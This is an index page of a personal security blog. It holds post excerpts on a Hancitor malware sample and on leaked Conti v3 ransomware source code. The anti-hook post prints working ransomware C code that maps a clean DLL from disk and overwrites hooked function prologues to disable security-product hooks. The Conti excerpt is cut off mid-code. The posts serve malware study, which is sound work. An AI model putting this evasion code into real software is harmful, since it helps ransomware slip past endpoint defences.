<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>scr1pt's blog</title><meta name="description" content="my dear virus, please fuck me"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/28/2021-12-16-hancitor/">2021-12-16-hancitor</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>之前看过两个hancitor的样本，但是从现在看来做的都太简单了，而且当时的各方面知识也都不是很完善。于是找了2021.12.26日的样本重新做一次详尽的分析。</p>
<blockquote>
<p>如果有错误可以联系我</p>
<p>qq：2466811523</p>
<p>mail: <a href="mailto:&#x32;&#52;&#54;&#54;&#x38;&#x31;&#x31;&#x35;&#50;&#51;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x32;&#52;&#54;&#54;&#x38;&#x31;&#x31;&#x35;&#50;&#51;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></p>
</blockquote>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><blockquote>
<p>md5: 9f09b1dd6235c28b091a7dbc9bcd9482<br>sha1: b7ac19b82e2f946e7cc047421875bbade3e880fd<br>sha256: 571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74</p>
<p>vt: <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details">https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details</a></p>
<p>hybrid: <a target="_blank" rel="noopener" href="https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a">https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a</a></p>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/beaconeye-cs/">http://blog.nsfocus.net/beaconeye-cs/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2021/12/16/index.html">https://www.malware-traffic-analysis.net/2021/12/16/index.html</a></p>
</blockquote></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-28</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 2470 words, 8 min 13 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/18/anti-hook/">anti-hook</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>part of conti v3 Ransomeware, by the way, fucking the school’s midterm exam. I’m longing for the day becoming stronger in Virus Learning. </p>
<h2 id="打开系统对应的文件"><a href="#打开系统对应的文件" class="headerlink" title="打开系统对应的文件"></a>打开系统对应的文件</h2><p>导入kernel32.dll并获取文件路径,打开文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hKernel32 = apLoadLibraryA(_STR(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);</span><br><span class="line"></span><br><span class="line">hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, <span class="number">0</span>, OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFile)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">DWORD Size = <span class="number">0</span>;</span><br><span class="line">    DWORD H;</span><br><span class="line">    LARGE_INTEGER LargeInt;</span><br><span class="line">    pGetFileSizeEx(hFile, &amp;LargeInt);</span><br><span class="line">    Size = LargeInt.QuadPart;</span><br><span class="line">    <span class="keyword">if</span> (!Size)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">hFileMap = apCreateFileMappingW(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFileMap)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, Size);</span><br><span class="line">    <span class="keyword">if</span> (!originDll)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取modules-NT-Header"><a href="#获取modules-NT-Header" class="headerlink" title="获取modules NT Header"></a>获取modules NT Header</h2><blockquote>
<p>在 IMAGE_DOS_HEADER 结构体中的 e_lfanew 成员指定了 NT 头的偏移为 000000f0。这两个范围中间就是 DOS stub 的偏移区域。</p>
<p>计算NT头的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PNTHeader = ImageBase + dosHeader -&gt;e_Ifanew</span><br></pre></td></tr></table></figure>

<p>根据NT_headers 找到OptionalHeader</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>Optional Headers</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"> WORD        Magic;</span><br><span class="line"> BYTE        MajorLinkerVersion;</span><br><span class="line"> BYTE        MinorLinkerVersion;</span><br><span class="line"> DWORD       SizeOfCode;</span><br><span class="line"> DWORD       SizeOfInitializedData;</span><br><span class="line"> DWORD       SizeOfUninitializedData;</span><br><span class="line"> DWORD       AddressOfEntryPoint;</span><br><span class="line"> DWORD       BaseOfCode;</span><br><span class="line"> ULONGLONG   ImageBase;</span><br><span class="line"> DWORD       SectionAlignment;</span><br><span class="line"> DWORD       FileAlignment;</span><br><span class="line"> WORD        MajorOperatingSystemVersion;</span><br><span class="line"> WORD        MinorOperatingSystemVersion;</span><br><span class="line"> WORD        MajorImageVersion;</span><br><span class="line"> WORD        MinorImageVersion;</span><br><span class="line"> WORD        MajorSubsystemVersion;</span><br><span class="line"> WORD        MinorSubsystemVersion;</span><br><span class="line"> DWORD       Win32VersionValue;</span><br><span class="line"> DWORD       SizeOfImage;</span><br><span class="line"> DWORD       SizeOfHeaders;</span><br><span class="line"> DWORD       CheckSum;</span><br><span class="line"> WORD        Subsystem;</span><br><span class="line"> WORD        DllCharacteristics;</span><br><span class="line"> ULONGLONG   SizeOfStackReserve;</span><br><span class="line"> ULONGLONG   SizeOfStackCommit;</span><br><span class="line"> ULONGLONG   SizeOfHeapReserve;</span><br><span class="line"> ULONGLONG   SizeOfHeapCommit;</span><br><span class="line"> DWORD       LoaderFlags;</span><br><span class="line"> DWORD       NumberOfRvaAndSizes;</span><br><span class="line"> IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<p>IMAGE_DATA_DIRECTORY结构如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220418213329225.png" alt="image-20220418213329225"></p>
</blockquote>
<h2 id="检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。"><a href="#检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。" class="headerlink" title="检查文件位数，并获取IMAGE_DATA_DIRECTORY数据。"></a>检查文件位数，并获取<code>IMAGE_DATA_DIRECTORY</code>数据。</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the modules NT Header</span></span><br><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">&#123;</span><br><span class="line">    uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">        uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据<code>uiBaseAddress</code>和<code>uiExportDir</code>获取如下数据</p>
<ul>
<li>export directory</li>
<li>name pointers</li>
<li>the array of addresses</li>
<li>the array of name ordinals</li>
<li>the number of exported functions</li>
</ul>
<blockquote>
<p>结构体<code>_IMAGE_EXPORT_DIRECTORY</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line"> DWORD   Characteristics;</span><br><span class="line"> DWORD   TimeDateStamp;</span><br><span class="line"> WORD    MajorVersion;</span><br><span class="line"> WORD    MinorVersion;</span><br><span class="line"> DWORD   Name;</span><br><span class="line"> DWORD   Base;</span><br><span class="line"> DWORD   NumberOfFunctions;</span><br><span class="line"> DWORD   NumberOfNames;</span><br><span class="line"> DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">    uiExportDir = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">    uiNameArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">    uiAddressArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">    uiNameOrdinals = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames;</span><br></pre></td></tr></table></figure>

<h2 id="获取导出函数表"><a href="#获取导出函数表" class="headerlink" title="获取导出函数表"></a>获取导出函数表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">        &#123;</span><br><span class="line">            uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">                uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pCloseHandle(hFileMap);</span><br><span class="line">            pCloseHandle(hFile);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="检查hook"><a href="#检查hook" class="headerlink" title="检查hook"></a>检查hook</h2><ul>
<li>遍历函数<ul>
<li>检查是否有转发函数（这个概念还不是很清楚），若是则跳过</li>
<li>比较当前函数和系统中函数是否相同<ul>
<li>若函数已经被hook，则利用函数的前5byte进行覆盖，即antihook</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; dwCounter--; uiNameArray += <span class="keyword">sizeof</span>(DWORD), uiNameOrdinals += <span class="keyword">sizeof</span>(WORD))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(uiBaseAddress</span><br><span class="line">            + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">        uiAddressArray = uiBaseAddress</span><br><span class="line">            + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">                uiBaseAddress);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">    		<span class="comment">// loop the uiAddressArray with the uiNameOrdinals</span></span><br><span class="line">        uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compute the File Offset to the function code</span></span><br><span class="line">        UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray),</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line"> 				<span class="comment">// pass the for</span></span><br><span class="line">        <span class="type">bool</span> isForwarder = isForwardedFunc((<span class="type">const</span> <span class="type">void</span>*)funcAddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isForwarder) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!funcHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        BYTE* p = (BYTE*)funcHooked;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xe9</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xff</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">1</span>] != <span class="number">0x25</span>) <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __MINGW32__</span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = (<span class="built_in">memcmp</span>((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = m_memcmp((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __MINGW32</span></span></span><br><span class="line">        <span class="keyword">if</span> (!funcIsHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">        DWORD oldProtect1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);</span></span><br><span class="line"><span class="comment">        VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32,</span></span><br><span class="line"><span class="comment">            _STR(&quot;VirtualProtect&quot;));</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//memcpy((void*)funcHooked, (void*)funcAddr, 10);</span></span><br><span class="line">        CopyMemory((<span class="type">void</span>*)funcHooked, (<span class="type">void</span>*)funcAddr, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, oldProtect, &amp;oldProtect1))</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware/" title="Ransomeware">Ransomeware </a><span class="leancloud_visitors"></span><span>About 919 words, 3 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/18/conti%20v3%20source%20code%20learning/">Conti v3 Ransomeware Souce Code Analysis</a></h3></div><div class="post-content"><div class="card"><p><h2 id="prockiller"><a href="#prockiller" class="headerlink" title="prockiller"></a>prockiller</h2><h3 id="memorySnapshot"><a href="#memorySnapshot" class="headerlink" title="memorySnapshot"></a>memorySnapshot</h3><ul>
<li>pCreateToolhelp32Snapshot</li>
<li>pProcess32FirstW</li>
<li>pProcess32NextW</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;prockiller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../obfuscation/MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST 